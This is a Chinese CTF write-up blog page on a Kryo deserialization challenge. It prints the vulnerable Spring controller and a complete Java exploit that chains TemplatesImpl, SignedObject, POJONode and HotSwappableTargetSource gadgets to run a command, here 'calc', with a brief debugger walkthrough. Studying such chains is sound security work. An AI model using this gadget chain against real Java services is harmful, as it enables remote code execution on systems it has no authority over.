@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>从CISCN西南分区赛学习Kryo反序列化 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="从CISCN西南分区赛学习Kryo反序列化 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-06-26T09:54:38.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>June</span>
+            <span>26,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">从CISCN西南分区赛学习Kryo反序列化</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>跟m1sery师傅学习Kryo反序列化</p>
+<h1 id="一、Challenge-amp-amp-Exploit"><a href="#一、Challenge-amp-amp-Exploit" class="headerlink" title="一、Challenge&amp;&amp;Exploit"></a>一、Challenge&amp;&amp;Exploit</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.sea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MessageController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">message</span><span class="params">(String message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] decodemsg;</span><br><span class="line">        <span class="keyword">if</span> (message == <span class="literal">null</span>) &#123;</span><br><span class="line">            decodemsg = Base64.getDecoder().decode(<span class="string">&quot;ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAHLyYj656nh3Rj89bSK7ufJrcoDAXRpbWVzdGFt8AnMwumxjGIBAWNvbS5zZWEuVXNl8gEBMbABc2VhY2xvdWTz&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                decodemsg = Base64.getDecoder().decode(message);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                decodemsg = Base64.getDecoder().decode(<span class="string">&quot;ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAGBw5uOyvHs1sGsg/nqhOyP9pIDAXRpbWVzdGFt8AnmifmxjGIBAWNvbS5zZWEuVXNl8gEBMbABZXJyb/I=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CodecMessageConverter</span> <span class="variable">codecMessageConverter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CodecMessageConverter</span>(<span class="keyword">new</span> <span class="title class_">MessageCodec</span>());</span><br><span class="line">        Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders)<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> messagecode.getPayload();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687432499979-1c4a2c1b-f8a9-48c0-96ea-0c794e709204.png#averageHue=%23393529&clientId=ub30ea017-3b36-4&from=paste&height=151&id=u012104ed&originHeight=189&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152925&status=done&style=none&taskId=u69bc7f03-f62d-40a3-9dea-0547fb666a1&title=&width=440.8" alt="image.png"><br>比较明显的kryo反序列化，没啥好说的。<br>漏洞点很明显就在<code>codecMessageConverter.toMessage</code>里面，并且给了一个比较明显的base64字符串，看一下<code>codecMessageConverter</code>类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687432792837-b30bf16f-d0ec-4853-a7d6-d528e609ccdb.png#averageHue=%2331322f&clientId=ub30ea017-3b36-4&from=paste&height=187&id=u2640b8eb&originHeight=234&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193398&status=done&style=none&taskId=u8dd61e71-da3f-4e30-aba5-1246d3bb732&title=&width=464.8" alt="image.png"><br>有一个toMessage和fromMessage，对应的就是序列化和反序列化了，我们生成payload的bytes字节肯定就是使用fromMessage方法了。我就比较懒直接放EXP了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.GenericMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilGeneratedByJavassist&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public EvilGeneratedByJavassist()&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, pojoNode1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置二次反序列化入口</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次反序列化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pojoNode2);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;whatever&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 手动构造 HashMap 以防触发正向利用链</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, h1, h1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, h2, h2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="comment">//String serial = serial(hashMap);</span></span><br><span class="line">        <span class="comment">//System.out.println(serial);</span></span><br><span class="line">        <span class="type">CodecMessageConverter</span> <span class="variable">codecMessageConverter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CodecMessageConverter</span>(<span class="keyword">new</span> <span class="title class_">MessageCodec</span>());</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">GenericMessage</span> <span class="variable">genericMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GenericMessage</span>(hashMap);</span><br><span class="line">        <span class="type">byte</span>[] decodemsg = (<span class="type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="comment">//Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);</span></span><br><span class="line">        <span class="comment">//messagecode.getPayload();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="二、原理分析"><a href="#二、原理分析" class="headerlink" title="二、原理分析"></a>二、原理分析</h1><p>调试一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687432921334-b882ccb4-6e6c-482b-9890-8eb17f0837e9.png#averageHue=%232a2b29&clientId=ub30ea017-3b36-4&from=paste&height=550&id=u4e33cfad&originHeight=687&originWidth=1545&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1453363&status=done&style=none&taskId=ud186a633-ccef-4338-a422-25935ad2a9d&title=&width=1236" alt="image.png"><br>进入decode函数内部<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687433497613-31921d9c-b9ad-4df0-9bb5-8c32d8f79d20.png#averageHue=%232b2c28&clientId=ub30ea017-3b36-4&from=paste&height=342&id=ubb644e13&originHeight=427&originWidth=1305&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=794263&status=done&style=none&taskId=ud4a17be7-9ecd-4817-9b7e-d524b58cb69&title=&width=1044" alt="image.png"><br>进入dodecode方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687433514633-721b89ad-7d3e-4d1c-8ffd-d8b3e9d39ec7.png#averageHue=%232a2b29&clientId=ub30ea017-3b36-4&from=paste&height=491&id=ubf794ed2&originHeight=614&originWidth=1484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1255741&status=done&style=none&taskId=u7246b56a-60d7-4c9c-9fe8-359824b7a26&title=&width=1187.2" alt="image.png"><br>这里就进入了kryo的反序列化了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687433692143-ae3db249-fc81-4e3d-ae35-ef98aa199956.png#averageHue=%23292a28&clientId=ub30ea017-3b36-4&from=paste&height=502&id=u80d03431&originHeight=628&originWidth=1594&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1356724&status=done&style=none&taskId=u7c85c5f5-5489-4e80-9ada-6dc63dc5d80&title=&width=1275.2" alt="image.png"><br>然后可以看到获取了mapserializer，因为最外层是一个hashmap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687433744637-9581ff11-c943-4a9d-a9b0-cafa12918150.png#averageHue=%23292a26&clientId=ub30ea017-3b36-4&from=paste&height=218&id=u07f1b5f0&originHeight=273&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=452396&status=done&style=none&taskId=ubd4b21a4-3dc5-42bc-859a-01443580039&title=&width=969.6" alt="image.png"><br>然后在Mapserializer的read方法调用了这个map的put函数，当然第一次进入这里并不是恶意的map，第二次才是<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687433789280-53289dc0-787a-47ea-9784-26cd2beb03cc.png#averageHue=%232a2b2a&clientId=ub30ea017-3b36-4&from=paste&height=589&id=u6a48f34e&originHeight=736&originWidth=1432&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1386733&status=done&style=none&taskId=u711b279d-8300-45db-b00b-333a5be8b77&title=&width=1145.6" alt="image.png"><br>之后就是map的一系列调用链了。这里配合的是jackson+xstring+hotswapeer的链子，其实BadAttribute足以</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/07/02/BUUCTF%20Web%20WriteUp%207/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">BUUCTF Web Writeup 7</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/06/20/SCTF2023%20Web%20WriteUp/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">SCTF2023 Web WriteUp</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
